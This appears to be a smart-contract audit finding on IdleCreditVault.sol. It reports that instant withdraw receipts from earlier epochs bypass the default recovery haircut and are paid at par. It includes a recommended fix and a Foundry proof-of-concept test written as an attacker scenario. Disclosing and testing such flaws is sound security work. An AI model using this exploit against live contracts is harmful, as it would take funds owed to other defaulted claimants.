### Title
Stale-epoch instant withdraw receipts bypass default recovery haircut and are paid at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimInstantWithdrawRequest` trusts the aggregate `instantWithdrawsRequests[_user]` balance as "funded" once `defaultRecoveryFinalized` is set. Only receipts recorded under `defaultRecoveryEpoch` are haircutted via `_claimDefaultedInstantWithdrawRequest`; an unfunded instant receipt created in an earlier epoch keeps its full claim basis and is paid 1:1 through `_transferFundedClaim`. This is the same bug class as the SCTP fix: a receipt reconstructed/aggregated under one trust assumption (pre-default, fully-funded accounting) is reused after that assumption is invalidated (default) without re-verifying that it was actually funded in the epoch it belongs to.

### Finding Description
In `requestInstantWithdraw` the claim basis is recorded per epoch:

```solidity
instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
pendingInstantWithdraws += _amount;
``` [1](#0-0) 

At default finalization, the default-epoch instant bucket is haircut via `defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0` and `instantWithdrawClaimsByEpoch[epochNumber]` is included in the recovery basis. [2](#0-1) [3](#0-2) 

But `claimInstantWithdrawRequest` only applies the recovery price to `instantWithdrawsRequestsByEpoch[_user][defaultRecoveryEpoch]`:

```solidity
if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
    _claimDefaultedInstantWithdrawRequest(_user);
}
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
``` [4](#0-3) 

`_claimDefaultedInstantWithdrawRequest` clears only the `defaultEpoch` entry. Any `instantWithdrawsRequestsByEpoch[_user][e]` with `e < defaultRecoveryEpoch` survives inside the aggregate `instantWithdrawsRequests[_user]` and is paid at par. [5](#0-4) 

The reserve guard in `_transferFundedClaim` only requires `balance - defaultRecoveryReserve >= amount` — it does not verify that this specific receipt was ever funded. Non-reserve underlying can legitimately sit in the strategy (funded normal withdraws collected by `collectWithdrawFunds`, borrower interest sent via `sendInterestAndDeposits`, prefunded amounts counted by `_defaultPrefundedInstantReserve` for *other* users' current-epoch claims). `_defaultPrefundedInstantReserve` computes `instantWithdrawClaimsByEpoch[epochNumber] - pendingInstantWithdraws` for the current epoch only, so an older-epoch unfunded receipt is neither haircutted nor reserved. [6](#0-5) [7](#0-6) 

### Impact Explanation
An attacker holding an unfunded instant receipt from epoch N escapes the recovery haircut when the pool defaults in epoch N+k. They claim the full face value at par while every other defaulted claimant receives `claimBasis * defaultRecoveryPrice`. The payout comes from non-reserve strategy underlyings (funded claims of other users or prefunded instant amounts reserved pro-rata), i.e. direct theft / insolvency of the recovery waterfall. Loss equals the attacker's stale instant claim basis times `(1 - recoveryPrice)` — unbounded in size, proportional to their deposit.

### Likelihood Explanation
Requires an instant withdraw request that remains partially unfunded (`pendingInstantWithdraws > 0`) across an epoch boundary and a later default. This requires only honest-but-unfunded borrower behavior (borrower cannot fully repay `getInstantWithdrawFunds`), no privileged collusion. Whether `stopEpoch` permits rolling an epoch with `pendingInstantWithdraws > 0` without defaulting should be confirmed; the mixed funded/unfunded path in `testFinalizeDefaultClaimsFundedAndDefaultedInstantRedeemsInOneCall` shows partial funding states are reachable, and `_claimDefaultedInstantWithdrawRequest`'s epoch-scoped clearing is indifferent to which epoch the receipt was recorded in.

### Recommendation
In `_claimDefaultedInstantWithdrawRequest`, do not scope the haircut to `defaultRecoveryEpoch` alone. Treat the entire `instantWithdrawsRequests[_user]` aggregate — or at minimum all per-epoch buckets ≤ `defaultRecoveryEpoch` that were never funded — as defaulted claim basis, pay `amount * defaultRecoveryPrice / RECOVERY_FULL` via `_transferDefaultRecovery`, and only route the verifiably-funded remainder through `_transferFundedClaim`. Equivalently, track a per-user "funded instant" counter so claim-time verification mirrors `sctp_verify_init`: re-validate each receipt's epoch/funding status against `instantWithdrawClaimsByEpoch` and `pendingInstantWithdraws` rather than trusting the aggregate.

### Proof of Concept
```solidity
// Fork test against test/foundry/IdleCreditVault.t.sol harness
function testStaleEpochInstantReceiptEscapesHaircut() external {
    uint256 instantDelay = cdoEpoch.instantWithdrawDelay();
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(instantDelay, 1000, false);

    address attacker = makeAddr('stale-instant-attacker');
    uint256 amount = 10_000 * ONE_SCALE;
    _depositWithUser(attacker, amount, true);

    // Epoch 0: run with low APR so instant withdrawals trigger
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 4, _expectedFundsEndEpoch());

    // Epoch 1 (buffer): attacker requests instant withdraw, recorded under epochNumber == 1
    vm.prank(attacker);
    uint256 instantBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + instantDelay + 1);
    // Borrower underfunds: only part of pendingInstantWithdraws is collected
    // -> pendingInstantWithdraws > 0 carries into the next epoch boundary
    // (fund partially via deal + getInstantWithdrawFunds or let it lapse)
    deal(defaultUnderlying, borrower, 0);
    cdoEpoch.getInstantWithdrawFunds();

    // Epoch 2: pool defaults with attacker's receipt still in epoch-1 bucket
    _startEpochAndCheckPrices(2);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    _checkDefault();

    // Finalize at 50% recovery
    IdleCreditVault v = IdleCreditVault(address(strategy));
    uint256 totalBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest()
        - cdoEpoch.pendingWithdrawFees() + v.defaultPendingClaimBasis();
    uint256 recovered = totalBasis / 2;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    underlying.approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // Attacker claims: epoch-1 bucket is not cleared by _claimDefaultedInstantWithdrawRequest
    // (which only touches instantWithdrawsRequestsByEpoch[user][defaultRecoveryEpoch]),
    // so the aggregate is paid at par through _transferFundedClaim.
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    // BUG: pays ~instantBasis (par) instead of instantBasis * defaultRecoveryPrice / RECOVERY_FULL
    assertGt(underlying.balanceOf(attacker) - balPre, instantBasis * 6 / 10);
}
```
Note: the PoC assumes `stopEpoch`/`startEpoch` can roll past an epoch with `pendingInstantWithdraws > 0` without immediately defaulting; if the state machine forbids that, reduce to the case where the stale receipt outlives one `collectInstantWithdrawFunds` cycle before the default epoch and the claim still drains non-reserve funds ahead of funded claimants.

  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
```

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
